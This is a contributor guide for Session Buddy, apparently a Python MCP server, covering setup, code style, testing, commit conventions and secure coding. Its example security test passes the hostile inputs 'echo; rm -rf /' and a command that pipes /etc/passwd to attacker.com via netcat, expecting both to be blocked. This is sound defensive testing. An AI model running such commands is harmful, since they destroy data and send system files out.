# Contributing to Session Buddy

Thank you for your interest in contributing to Session Buddy! This document provides guidelines and instructions for contributing to the project.

## Table of Contents

- [Code of Conduct](#code-of-conduct)
- [Development Setup](#development-setup)
- [Code Style Guidelines](#code-style-guidelines)
- [Testing Requirements](#testing-requirements)
- [Commit Message Standards](#commit-message-standards)
- [Pull Request Process](#pull-request-process)
- [Security Considerations](#security-considerations)

## Code of Conduct

- Be respectful and inclusive
- Provide constructive feedback
- Focus on what is best for the community
- Show empathy towards other community members

## Development Setup

### Prerequisites

- Python 3.13+
- UV package manager (recommended) or pip
- Git
- Make (optional, for convenience scripts)

### Installation

```bash
# Clone the repository
git clone https://github.com/your-username/session-buddy.git
cd session-buddy

# Install dependencies (development mode)
uv sync --group dev

# OR using pip
pip install -e ".[dev]"

# Verify installation
python -c "from session_buddy.server import mcp; print('✅ MCP server ready')"
python -c "from session_buddy.reflection_tools import ReflectionDatabase; print('✅ Memory system ready')"
```

### Development Workflow

```bash
# 1. Create a feature branch
git checkout -b feature/your-feature-name

# 2. Make your changes
# Edit files...

# 3. Run pre-commit quality checks
uv sync --group dev
crackerjack lint
pytest -m "not slow"

# 4. Commit your changes (follow commit message standards)
git add .
git commit -m "feat: add your feature description"

# 5. Push and create PR
git push origin feature/your-feature-name
```

## Code Style Guidelines

### Python Standards

Session Buddy follows **strict modern Python 3.13+** practices:

#### Type Hints (Required)
- **100% type hint coverage** on all function signatures
- Use modern syntax: `str | None` instead of `Optional[str]`
- Use built-in collections: `list[str]` instead of `List[str]`
- Always import typing as `import typing as t`

```python
# ✅ Good
def process_data(data: list[str], threshold: int | None = None) -> dict[str, Any]:
    """Process data with optional threshold.

    Args:
        data: List of strings to process
        threshold: Optional threshold value

    Returns:
        Dictionary with processed results
    """
    pass

# ❌ Bad (no type hints)
def process_data(data, threshold=None):
    pass
```

#### Docstrings (Required)
- **All functions must have docstrings**
- Use Google style or NumPy style
- Include Args, Returns, Raises sections as needed

```python
def calculate_quality_score(project_dir: Path) -> dict[str, int | str]:
    """Calculate project quality score.

    Analyzes project structure, test coverage, and documentation
    to produce a quality score from 0-100.

    Args:
        project_dir: Path to project directory

    Returns:
        Dictionary with:
            - 'score': Overall quality score (0-100)
            - 'maturity': Maturity score (0-100)
            - 'coverage': Test coverage percentage
            - 'details': Detailed breakdown

    Raises:
        ValueError: If project_dir doesn't exist

    Example:
        >>> score = calculate_quality_score(Path.cwd())
        >>> print(f"Quality: {score['score']}/100")
    """
```

#### Error Handling
- **Never suppress exceptions silently** - avoid `suppress(Exception)`, `pass` on `except:`
- Always log exceptions with context
- Use specific exception types

```python
# ✅ Good
try:
    result = risky_operation()
    return result
except ValueError as e:
    logger.error(f"Invalid value in operation: {e}")
    raise
except Exception as e:
    logger.exception(f"Unexpected error in risky_operation")
    raise

# ❌ Bad
try:
    risky_operation()
except:
    pass  # Never do this!
```

#### Code Quality Rules

1. **DRY (Don't Repeat Yourself)**: If you write it twice, you're doing it wrong
2. **KISS (Keep It Simple, Stupid)**: Complexity is the enemy of maintainability
3. **YAGNI (You Ain't Gonna Need It)**: Build only what's needed NOW
4. **Cognitive Complexity ≤15**: Enforced by Ruff
5. **Maximum Function Length**: 50 lines (soft limit), 100 lines (hard limit)

### Ruff Configuration

The project uses **Ruff** with strict settings:

```bash
# Lint code
crackerjack lint

# Type checking
crackerjack typecheck

# Security scanning
crackerjack security

# Complexity analysis
crackerjack complexity

# Full analysis
crackerjack analyze
```

**Ruff Rules**:
- Max line length: 100 (soft), 120 (hard)
- Max complexity: 15 per function
- Forbidden patterns: `suppress(Exception)`, bare `except:`, `pass` on `except:`

## Testing Requirements

### Test Coverage

- **Minimum coverage**: 85% (enforced by CI)
- **Target coverage**: 95%+
- **Critical paths**: 100% (security, database operations)

### Test Structure

```
tests/
├── unit/              # Unit tests (fast, isolated)
│   ├── test_*.py
├── integration/       # Integration tests (slower, real dependencies)
│   └── test_*.py
├── functional/        # Functional tests (end-to-end workflows)
│   └── test_*.py
└── security/          # Security tests (injection, validation, etc.)
    └── test_*.py
```

### Writing Tests

```python
# ✅ Good test (clear, descriptive, comprehensive)
def test_parse_crackerjack_args_blocks_shell_injection():
    """Test shell metacharacters are blocked in arguments."""
    with pytest.raises(ValueError, match="Shell metacharacter"):
        _parse_crackerjack_args("echo; rm -rf /")

    with pytest.raises(ValueError, match="Shell metacharacter"):
        _parse_crackerjack_args("cat /etc/passwd | nc attacker.com 4444")

# ❌ Bad test (vague, no assertions)
def test_args():
    _parse_crackerjack_args("echo test")
```

### Running Tests

```bash
# Run all tests
pytest

# Quick smoke tests (exclude slow tests)
pytest -m "not slow"

# Specific test categories
pytest tests/unit/
pytest tests/integration/
pytest -m security

# With coverage
pytest --cov=session_buddy --cov-report=term-missing

# Coverage with failure threshold
pytest --cov=session_buddy --cov-fail-under=85

# Parallel execution (faster)
pytest -n auto
```

### Security Testing

Security tests are **mandatory** for any code that handles:
- User input (file paths, commands, arguments)
- External data (HTTP requests, file reads)
- System operations (subprocess, file I/O)

**Required Security Tests**:
- Command injection prevention
- Path traversal blocking
- Input validation
- Boundary conditions (overflow, underflow)

Example:
```python
def test_subprocess_blocks_absolute_path_bypass():
    """Test absolute path commands are blocked."""
    with pytest.raises(ValueError, match="Command not allowed"):
        SafeSubprocess.run_safe(
            ["/bin/echo", "test"],
            allowed_commands={"echo"}
        )
```

## Commit Message Standards

Session Buddy follows **Conventional Commits** specification:

### Format

```
<type>(<scope>): <subject>

<body>

<footer>
```

### Types

- `feat`: New feature
- `fix`: Bug fix
- `docs`: Documentation changes
- `style`: Code style changes (formatting, etc.)
- `refactor`: Code refactoring
- `perf`: Performance improvement
- `test`: Test additions or changes
- `chore`: Maintenance tasks
- `security`: Security vulnerability fix

### Scopes

Common scopes:
- `core`: Core session management
- `mcp`: MCP server functionality
- `tools`: MCP tools
- `utils`: Utility functions
- `security`: Security features
- `tests`: Test infrastructure
- `docs`: Documentation
- `ci`: CI/CD configuration

### Example

```
feat(security): Add command injection prevention for crackerjack args

Implement shlex-based argument parser to prevent shell injection attacks
in crackerjack command execution.

- Add _parse_crackerjack_args() with allowlist validation
- Block shell metacharacters (; | & $ ` ( ) < > \n \r)
- Add 10 comprehensive security tests (all passing)

Fixes #123
Security: CVE-2024-XXXX prevention

Co-Authored-By: Contributor Name <email@example.com>
```

## Pull Request Process

### Before Opening a PR

1. **Ensure all tests pass**:
   ```bash
   pytest --cov=session_buddy --cov-fail-under=85
   ```

2. **Run quality checks**:
   ```bash
   crackerjack lint
   crackerjack typecheck
   crackerjack security
   ```

3. **Update documentation** if applicable

4. **Add tests** for new functionality (100% coverage on new code)

### PR Description Template

```markdown
## Summary
<!-- Brief description of changes -->

## Changes
- [ ] Breaking changes (list below)
- [ ] New features (list below)
- [ ] Bug fixes (list below)
- [ ] Documentation updates
- [ ] Tests added/updated

## Testing
- [ ] Unit tests pass (`pytest tests/unit/`)
- [ ] Integration tests pass (`pytest tests/integration/`)
- [ ] Security tests pass (`pytest tests/security/`)
- [ ] Coverage ≥85% (`pytest --cov=session_buddy`)

## Quality Checks
- [ ] Ruff linting passes (`crackerjack lint`)
- [ ] Type checking passes (`crackerjack typecheck`)
- [ ] Security scan passes (`crackerjack security`)

## Checklist
- [ ] Code follows style guidelines
- [ ] Self-review completed
- [ ] Comments added to complex code
- [ ] Documentation updated
- [ ] No new warnings generated
- [ ] Tests added for feature/bug fix
- [ ] All tests passing
```

### Review Process

1. **Automated checks**: CI runs tests, linting, type checking
2. **Code review**: Maintainer reviews for:
   - Code quality and style
   - Test coverage
   - Security considerations
   - Documentation
   - Performance impact
3. **Approval**: At least one maintainer approval required
4. **Merge**: Squash and merge to main branch

## Security Considerations

### Vulnerability Reporting

**Do NOT open public issues for security vulnerabilities!**

Instead, send an email to: security@example.com

Include:
- Description of vulnerability
- Steps to reproduce
- Impact assessment
- Suggested fix (if known)

### Secure Coding Guidelines

1. **Input Validation**: Always validate user input
   ```python
   # ✅ Good
   if not path or len(path) > 4096:
       raise ValueError("Invalid path")
   ```

2. **Sanitization**: Remove sensitive data from subprocess environments
   ```python
   SENSITIVE_PATTERNS = {"PASSWORD", "TOKEN", "SECRET", "KEY"}
   env = {k: v for k, v in os.environ.items()
          if not any(p in k.upper() for p in SENSITIVE_PATTERNS)}
   ```

3. **Safe Defaults**: Use secure defaults
   ```python
   subprocess.run(cmd, shell=False)  # Never shell=True
   ```

4. **Principle of Least Privilege**: Request minimal permissions

## Getting Help

- **Documentation**: Check [README.md](README.md) and docs/
- **Issues**: Search existing issues before creating new ones
- **Discussions**: Use GitHub Discussions for questions
- **Chat**: Join our community chat (link in README)

## Recognition

Contributors will be recognized in:
- CONTRIBUTORS.md file
- Release notes
- Project README

Thank you for contributing to Session Buddy! 🎉
